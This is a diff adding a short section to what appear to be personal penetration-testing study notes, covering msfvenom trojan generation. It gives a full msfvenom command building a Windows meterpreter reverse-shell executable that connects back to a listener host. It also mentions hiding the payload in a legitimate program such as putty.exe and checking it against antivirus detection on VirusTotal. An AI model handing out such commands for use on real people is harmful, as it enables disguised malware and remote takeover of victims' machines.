@@ -79,3 +79,17 @@ https://fmash16.github.io/content/writeups/hackthebox/htb-Passage.html
 
 => logs can be checked under: /home/kali/.msf4/logs/
 ![stagedVsNonStagedPayload](img/stagedVsNonStagedPayload.png)
+
+# msfvenom (file generation)
+* When we have secure systems (so system does not have known vulnurabilities), we can create trojans and make somebody open it.
+* we can use msfvenom to generate malicous file for f.e: exe, apk, py, etc. The process is that we generate this trojan and once somebody exexutes this file we will have a connection to the victim.
+
+Example: 
+`/usr/bin/msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 LPORT=5555 -f exe -o sampleTrojan.exe`
+but you can also encode it and attach it to a valid programm (like f.e.: putty.exe with -x)
+
+Set up connection with msfconsole `use exploit/multi/handler`
+## Virustotal toe check if payloads got recongized: https://www.virustotal.com/gui/
+
+
+
